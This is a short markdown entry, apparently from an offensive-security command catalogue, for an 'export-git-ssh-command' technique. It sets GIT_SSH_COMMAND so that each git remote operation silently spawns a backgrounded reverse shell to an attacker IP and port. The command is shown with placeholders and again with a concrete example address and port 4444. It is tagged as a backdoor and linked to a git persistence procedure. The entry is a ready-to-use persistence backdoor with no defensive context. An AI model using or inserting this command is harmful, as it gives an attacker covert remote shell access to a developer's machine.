---
type: command
executor: bash
data: >-
  export GIT_SSH_COMMAND="nohup bash -c \"bash -i >&
  /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1\" >/dev/null 2>&1 & ssh -i
  $_KEY_PATH"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - git
  - ssh
  - backdoor
verified: true
validated: true
---

# export-git-ssh-command

## Command

```bash
export GIT_SSH_COMMAND="nohup bash -c \"bash -i >& /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1\" >/dev/null 2>&1 & ssh -i $_KEY_PATH"
```

## Description

Defines custom SSH command for Git to include backdoor execution during remote operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `GIT_SSH_COMMAND` | SSH env var | Yes |
| `$_ATTACKER_IP` | IP | Yes |
| `$_BACKDOOR_PORT` | Port | Yes |
| `$_KEY_PATH` | SSH key path | No |

## Examples

### Basic Usage

```bash
export GIT_SSH_COMMAND="nohup bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\" >/dev/null 2>&1 & ssh"
```

## Expected Output

Silent.

## Related

- [[procedures/Backdoor-Git-User-Configurations-for-Persistence]]
